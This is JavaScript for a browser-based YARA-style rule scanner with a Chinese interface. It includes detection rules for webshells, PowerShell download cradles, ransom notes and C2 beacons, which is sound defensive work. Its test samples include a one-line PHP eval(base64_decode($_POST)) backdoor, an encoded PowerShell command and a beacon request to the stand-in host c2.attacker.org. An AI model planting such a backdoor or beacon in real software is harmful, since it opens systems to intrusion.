import * as scanner from "../../_build/js/debug/build/wasm/wasm.js";

const TEMPLATES = {
  webshell: `rule Suspicious_Webshell {
    meta:
        description = "Detects PHP webshell execution patterns"
        severity = "critical"
    strings:
        $tag = "<?php" nocase
        $eval = "eval("
        $b64 = "base64_decode("
        $post = "$_POST["
    condition:
        $tag at 0 and ($eval or $b64) and $post
}`,
  powershell: `rule Suspicious_PowerShell_Cradle {
    meta:
        description = "Detects obfuscated PowerShell download cradles"
        severity = "high"
    strings:
        $ps = /powershell(\.exe)?\s+(-(no)?p(rofile)?\s+)?-e(nc(odedcommand)?)?\s+[A-Za-z0-9+/=]+/ nocase
        $client = /New-Object\s+Net\.WebClient/ nocase
        $dl = /\.(DownloadString|DownloadFile)\s*\(\s*['"]https?:\/\// nocase
    condition:
        $ps or ($client and $dl)
}`,
  ransomware: `rule Ransomware_Note_Indicator {
    meta:
        description = "Detects extortion and ransom message keywords"
        severity = "critical"
    strings:
        $header = "All your files have been encrypted" nocase
        $btc = "bitcoin" nocase
        $onion = ".onion" nocase
    condition:
        $header and ($btc or $onion)
}`,
  c2: `rule C2_Beacon_HTTP_Traffic {
    meta:
        description = "Detects command & control HTTP beacon telemetry"
        severity = "critical"
    strings:
        $ua = /User-Agent:\s*(curl\/\d+\.\d+|python-requests\/\d+\.\d+)/ nocase
        $c2_uri = /GET\s+\/(api\/v[12]\/tasks|beacon\/heartbeat)\?[a-zA-Z0-9_=-]+/ nocase
    condition:
        $c2_uri and $ua
}`
};

const SAMPLES = {
  webshell_malicious: "<?php\n// Admin backdoor\n$data = $_POST['cmd'];\neval(base64_decode($data));\n?>",
  webshell_clean: "<?php\n// Standard application router\necho 'Welcome to production portal';\n?>",
  powershell_malicious: "C:\\Windows\\system32\\cmd.exe /c powershell.exe -NoProfile -enc SQBFAFgAKABOAGUAdwA=",
  c2_malicious: "GET /api/v1/tasks?node=host-889 HTTP/1.1\r\nHost: c2.attacker.org\r\nUser-Agent: python-requests/2.28\r\n\r\n"
};

const ruleInput = document.getElementById("ruleInput");
const sampleInput = document.getElementById("sampleInput");
const reportOutput = document.getElementById("reportOutput");
const matchSummary = document.getElementById("matchSummary");
const engineStatus = document.getElementById("engineStatus");
const templateSelect = document.getElementById("ruleTemplateSelect");
const validateBtn = document.getElementById("validateBtn");
const scanBtn = document.getElementById("scanBtn");
const dropZone = document.getElementById("dropZone");

// Initialize with default template
ruleInput.value = TEMPLATES.webshell;
sampleInput.value = SAMPLES.webshell_malicious;

try {
  const count = scanner.check_rule_syntax(ruleInput.value);
  if (count >= 0) {
    engineStatus.textContent = "MoonBit WebAssembly 引擎已就绪";
    engineStatus.style.color = "#3fb950";
  }
} catch (e) {
  engineStatus.textContent = "引擎初始化失败: " + e;
  engineStatus.style.color = "#f85149";
}

templateSelect.addEventListener("change", (e) => {
  const key = e.target.value;
  if (TEMPLATES[key]) {
    ruleInput.value = TEMPLATES[key];
    if (key === "powershell") {
      sampleInput.value = SAMPLES.powershell_malicious;
    } else if (key === "c2") {
      sampleInput.value = SAMPLES.c2_malicious;
    } else {
      sampleInput.value = SAMPLES.webshell_malicious;
    }
  }
});

document.getElementById("loadMaliciousSample").addEventListener("click", () => {
  const key = templateSelect.value;
  if (key === "powershell") {
    sampleInput.value = SAMPLES.powershell_malicious;
  } else if (key === "c2") {
    sampleInput.value = SAMPLES.c2_malicious;
  } else {
    sampleInput.value = SAMPLES.webshell_malicious;
  }
});

document.getElementById("loadCleanSample").addEventListener("click", () => {
  sampleInput.value = SAMPLES.webshell_clean;
});

validateBtn.addEventListener("click", () => {
  try {
    const count = scanner.check_rule_syntax(ruleInput.value);
    if (count >= 0) {
      alert(`[+] 规则语法校验成功：成功解析 ${count} 条规则。`);
    } else {
      alert("[-] 规则语法错误，请检查语法规则。");
    }
  } catch (err) {
    alert("[-] 校验异常: " + err);
  }
});

scanBtn.addEventListener("click", () => {
  const ruleSrc = ruleInput.value;
  const sampleText = sampleInput.value;

  try {
    const jsonStr = scanner.scan_text_to_json(ruleSrc, sampleText);
    const report = JSON.parse(jsonStr);

    if (report.error) {
      reportOutput.textContent = "[!] 规则编译失败:\n" + report.error;
      matchSummary.textContent = "编译错误";
      matchSummary.style.color = "#f85149";
      return;
    }

    if (report.matches_count > 0) {
      matchSummary.textContent = `检出 ${report.matches_count} 条威胁规则命中！`;
      matchSummary.style.color = "#f85149";
      let formatted = `=================== 威胁检出报告 ===================\n`;
      formatted += `扫描数据大小: ${report.size} 字节\n`;
      formatted += `命中规则总数: ${report.matches_count}\n\n`;

      for (const m of report.matches) {
        formatted += `[!] 命中规则: ${m.rule}\n`;
        if (m.tags && m.tags.length > 0) {
          formatted += `    标签: ${m.tags.join(", ")}\n`;
        }
        formatted += `    匹配字符串清单:\n`;
        for (const s of m.strings) {
          formatted += `      - 标识: ${s.id} | 偏移量: ${s.offset} | 匹配长度: ${s.length}\n`;
        }
        formatted += "\n";
      }

      reportOutput.textContent = formatted;
    } else {
      matchSummary.textContent = "未发现匹配特征（干净样本）";
      matchSummary.style.color = "#3fb950";
      reportOutput.textContent = `[+] 扫描完成：目标数据 (${report.size} 字节) 未命中任何已配置的规则特征。`;
    }
  } catch (err) {
    reportOutput.textContent = "扫描执行异常: " + err;
  }
});

// Drag & Drop handler for local offline file inspection
dropZone.addEventListener("dragover", (e) => {
  e.preventDefault();
  dropZone.classList.add("dragover");
});

dropZone.addEventListener("dragleave", () => {
  dropZone.classList.remove("dragover");
});

dropZone.addEventListener("drop", (e) => {
  e.preventDefault();
  dropZone.classList.remove("dragover");

  const files = e.dataTransfer.files;
  if (files.length > 0) {
    const file = files[0];
    const reader = new FileReader();
    reader.onload = (event) => {
      sampleInput.value = event.target.result;
      dropZone.textContent = `已载入本地文件: ${file.name} (${file.size} 字节)`;
    };
    reader.readAsText(file);
  }
});
